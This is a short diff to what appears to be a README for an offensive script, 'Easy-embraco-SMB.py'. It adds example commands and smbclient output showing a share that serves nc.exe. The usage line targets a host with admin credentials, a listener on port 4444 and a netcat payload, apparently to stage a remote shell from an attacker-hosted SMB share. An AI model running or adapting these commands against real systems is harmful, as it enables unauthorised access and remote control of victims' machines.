@@ -15,3 +15,13 @@ optional arguments:\
 
 ## Example usage
 sudo python3 Easy-embraco-SMB.py --target 0.0.0.0 --host 0.0.0.0 --port 4444 --user admin@admin.com --pass admin --load ./nc.exe
+
+## Confirmation SMB is hosting our nc.exe file
+sudo smbclient -H \\\\127.0.0.1\\share\
+
+dir\
+
+smb: \> dir\
+  .                                   D\
+  ..                                  D\
+  nc.exe                              N\
